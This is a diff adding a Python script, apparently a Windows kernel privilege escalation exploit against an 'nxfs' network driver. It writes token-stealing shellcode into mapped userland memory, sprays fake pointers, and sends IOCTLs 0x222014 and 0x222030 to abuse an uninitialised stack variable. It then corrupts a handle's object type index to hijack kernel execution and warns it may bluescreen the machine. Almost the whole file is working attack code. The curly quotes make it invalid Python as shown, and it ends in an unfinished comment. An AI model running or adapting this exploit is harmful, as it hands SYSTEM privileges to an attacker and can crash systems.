@@ -1,0 +1,451 @@
+from ctypes import *
+
+from ctypes.wintypes import *
+
+import struct
+
+import sys
+
+import os
+
+ 
+
+MEM_COMMIT = 0x00001000
+
+MEM_RESERVE = 0x00002000
+
+PAGE_EXECUTE_READWRITE = 0x00000040
+
+GENERIC_READ  = 0x80000000
+
+GENERIC_WRITE = 0x40000000
+
+OPEN_EXISTING = 0x3
+
+STATUS_INVALID_HANDLE = 0xC0000008
+
+ 
+
+shellcode_len = 90
+
+s = “”
+
+s += “\x65\x48\x8B\x04\x25\x88\x01\x00”        #mov rax, [gs:0x188]
+
+s += “\x00”
+
+s += “\x48\x8B\x40\x70”                                  #mov rax, [rax + 0x70]
+
+s += “\x48\x8B\x98\x90\x02\x00\x00”                 #mov rbx, [rax + 0x290]   
+
+s += “\x48\x8B\x80\x88\x01\x00\x00”                 #mov rax, [rax + 0x188]
+
+s += “\x48\x2D\x88\x01\x00\x00”                     #sub rax, 0x188
+
+s += “\x48\x39\x98\x80\x01\x00\x00”                 #cmp [rax + 0x180], rbx
+
+s += “\x75\xEA”                                               #jne Loop1
+
+s += “\x48\x89\xC1”                                     #mov rcx, rax
+
+s += “\xBA\x04\x00\x00\x00”                        #mov rdx, 0x4
+
+s += “\x48\x8B\x80\x88\x01\x00\x00”                 #mov rax, [rax + 0x188]
+
+s += “\x48\x2D\x88\x01\x00\x00”                     #sub rax, 0x188
+
+s += “\x48\x39\x90\x80\x01\x00\x00”                 #cmp [rax + 0x180], rdx
+
+s += “\x75\xEA”                                               #jne Loop2
+
+s += “\x48\x8B\x80\x08\x02\x00\x00”                 #mov rax, [rax + 0x208]   
+
+s += “\x48\x89\x81\x08\x02\x00\x00”                 #mov [rcx + 0x208], rax
+
+s += “\x48\x31\xC0”                                     #xor rax,rax
+
+s += “\xc3”                                                  #ret
+
+shellcode = s
+
+ 
+
+ 
+
+”’
+
+* Convert a python string to PCHAR
+
+@Param string – the string to be converted.
+
+@Return – a PCHAR that can be used by winapi functions.
+
+”’
+
+def str_to_pchar(string):
+
+      pString = c_char_p(string)
+
+ 
+
+      return pString
+
+ 
+
+”’
+
+* Map memory in userspace using NtAllocateVirtualMemory
+
+@Param address – The address to be mapped, such as 0x41414141.
+
+@Param size – the size of the mapping.
+
+@Return – a tuple containing the base address of the mapping and the size returned.
+
+”’
+
+def map_memory(address, size):
+
+      temp_address = c_void_p(address)
+
+      size = c_uint(size)
+
+ 
+
+      proc = windll.kernel32.GetCurrentProcess()
+
+      nt_status = windll.ntdll.NtAllocateVirtualMemory(c_void_p(proc),
+
+                                            byref(temp_address), 0,
+
+                                            byref(size),
+
+                                            MEM_RESERVE|MEM_COMMIT,
+
+                                            PAGE_EXECUTE_READWRITE)
+
+ 
+
+      #The mapping failed, let the calling code know
+
+      if nt_status != 0:
+
+            return (-1, c_ulong(nt_status).value)
+
+      else:
+
+            return (temp_address, size)
+
+ 
+
+”’
+
+* Write to some mapped memory.
+
+@Param address – The address in memory to write to.
+
+@Param size – The size of the write.
+
+@Param buffer – A python buffer that holds the contents to write.
+
+@Return – the number of bytes written.
+
+”’
+
+def write_memory(address, size, buffer):
+
+      temp_address = c_void_p(address)
+
+      temp_buffer = str_to_pchar(buffer)
+
+      proc = c_void_p(windll.kernel32.GetCurrentProcess())
+
+      bytes_ret = c_ulong()
+
+      size = c_uint(size)
+
+ 
+
+      windll.kernel32.WriteProcessMemory(proc,
+
+                                                      temp_address,
+
+                                                      temp_buffer,
+
+                                                      size,
+
+                                                      byref(bytes_ret))
+
+ 
+
+      return bytes_ret
+
+ 
+
+”’
+
+* Get a handle to a device by its name. The calling code is responsible for
+
+* checking the handle is valid.
+
+@Param device_name – a string representing the name, ie \\\\.\\nxfs-net….
+
+”’
+
+def get_handle(device_name):
+
+      return windll.kernel32.CreateFileA(device_name,
+
+                                GENERIC_READ | GENERIC_WRITE,
+
+                                0,
+
+                                None,
+
+                                OPEN_EXISTING,
+
+                                0,
+
+                                None)
+
+ 
+
+def main():
+
+      print “[+] Attempting to exploit uninitialised stack variable, this has a chance of causing a bsod!”
+
+ 
+
+      print “[+] Mapping the regions of memory we require”
+
+ 
+
+      #Try and map the first 3 critical regions, if any of them fail we exit.
+
+      address_1, size_1 = map_memory(0x14c00000, 0x1f0000)
+
+      if address_1 == -1:
+
+            print “[x] Mapping 0x610000 failed with error %x” %size_1
+
+            sys.exit(-1)
+
+ 
+
+      address_2, size_2 = map_memory(0x41414141, 0x100000)
+
+      if address_2 == -1:
+
+            print “[x] Mapping 0x41414141 failed with error %x” %size_2
+
+            sys.exit(-1)
+
+ 
+
+      address_3, size_3 = map_memory(0xbad0b0b0, 0x1000)
+
+      if address_3 == -1:
+
+          print “[x] Mapping 0xbad0b0b0 failed with error %x” %size_3
+
+          sys.exit(-1)
+
+ 
+
+      #this will hold our shellcode
+
+      sc_address, sc_size = map_memory(0x42424240, 0x1000)
+
+      if sc_address == -1:
+
+          print “[x] Mapping 0xbad0b0b0 failed with error %x” %sc_size
+
+          sys.exit(-1)
+
+ 
+
+      #Now we write certain values to those mapped memory regions
+
+      print “[+] Writing data to mapped memory…”
+
+      #the first write involves storing a pointer to our shellcode
+
+      #at offset 0xbad0b0b0+0xa8
+
+      buff = “\x40BBB” #0x42424240
+
+      bytes_written = write_memory(0xbad0b0b0+0xa8, 4, buff)
+
+     
+
+      write_memory(0x42424240, shellcode_len, shellcode)
+
+ 
+
+      #the second write involves spraying the first memory address with pointers
+
+      #to our second mapped memory.
+
+      print “\t spraying unitialised pointer memory with userland pointers”
+
+     
+
+      buff = “\x40AAA” #0x0000000041414140
+
+      for offset in range(4, size_1.value, 8):
+
+            temp_address = address_1.value + offset
+
+            write_memory(temp_address, 4, buff)
+
+ 
+
+      #the third write simply involves setting 0x41414140-0x18 to 0x5
+
+      #this ensures the kernel creates a handle to a TOKEN object.
+
+      print “[+] Setting TOKEN type index in our userland pointer”
+
+      buff = “\x05”
+
+      temp_address = 0x41414140-0x18
+
+      write_memory(temp_address, 1, buff)
+
+ 
+
+      print “[+] Writing memory finished, getting handle to first device”
+
+      handle = get_handle(“\\\\.\\nxfs-709fd562-36b5-48c6-9952-302da6218061”)
+
+ 
+
+      if handle == STATUS_INVALID_HANDLE:
+
+            print “[x] Couldn’t get handle to \\\\.\\nxfs-709fd562-36b5-48c6-9952-302da6218061”
+
+            sys.exit(-1)
+
+ 
+
+      #if we have a valid handle, we now need to send ioctl 0x222014
+
+      #this creates a new device for which ioctl 0x222030 can be sent
+
+      in_buff = struct.pack(“<I”, 0x190) +  struct.pack(“<I”, 0x1) + “AA”
+
+      in_buff = str_to_pchar(in_buff)
+
+      out_buff = str_to_pchar(“A”*0x90)
+
+      bytes_ret = c_ulong()
+
+ 
+
+      ret = windll.kernel32.DeviceIoControl(handle,
+
+                                      0x222014,
+
+                                      in_buff,
+
+                                      0x10,
+
+                                      out_buff,
+
+                                      0x90,
+
+                                      byref(bytes_ret),
+
+                                      0)
+
+      if ret == 0:
+
+            print “[x] IOCTL 0x222014 failed”
+
+            sys.exit(-1)
+
+ 
+
+      print “[+] IOCTL 0x222014 returned success”
+
+ 
+
+      #get a handle to the next device for which we can send the vulnerable ioctl.
+
+      print “[+] Getting handle to \\\\.\\nxfs-net-709fd562-36b5-48c6-9952-302da6218061{709fd562-36b5-48c6-9952-302da6218061}”
+
+      handle = get_handle(“\\\\.\\nxfs-net-709fd562-36b5-48c6-9952-302da6218061{709fd562-36b5-48c6-9952-302da6218061}”)
+
+ 
+
+      if handle == STATUS_INVALID_HANDLE:
+
+            print “[x] Couldn’t get handle”
+
+            sys.exit(-1)
+
+ 
+
+      #this stage involves attempting to manipulate the Object argument on the stack.
+
+      #we found that making repeated calles to CreateFileA increased this value.
+
+      print “[+] Got handle to second device, now generating a load more handles”
+
+      for i in range(0, 900000):
+
+            temp_handle = get_handle(“\\\\.\\nxfs-net-709fd562-36b5-48c6-9952-302da6218061{709fd562-36b5-48c6-9952-302da6218061}”)
+
+ 
+
+      #coming towards the end, we send ioctl 0x222030, this has the potential to bluescreen the system.
+
+      #we don’t care about the return code.
+
+      print “[+] Sending IOCTL 0x222030”
+
+      in_buff = str_to_pchar(“A”*0x30)
+
+      out_buff = str_to_pchar(“B”*0x30)
+
+ 
+
+      windll.kernel32.DeviceIoControl(handle,
+
+                                    0x222030,
+
+                                    in_buff,
+
+                                    0x30,
+
+                                    out_buff,
+
+                                    0x30,
+
+                                    byref(bytes_ret),
+
+                                    0)
+
+ 
+
+      #finally, we confuse the kernel by setting our object type index to 1.
+
+      #this then points to 0xbad0b0b0, and namely 0xbad0b0b0+0xa8 for the close procedure(???)
+
+      print “[+] Setting our object type index to 1”
+
+      temp_address = 0x41414140-0x18
+
+      write_memory(temp_address, 1, “\x01”)
+
+ 
+
+      #The process should now exit, where the kernel will attempt to clean up our dodgy handle
+
+      #This will cause …..
+
+ 
+
+if __name__ == ‘__main__’:
+
+      main()
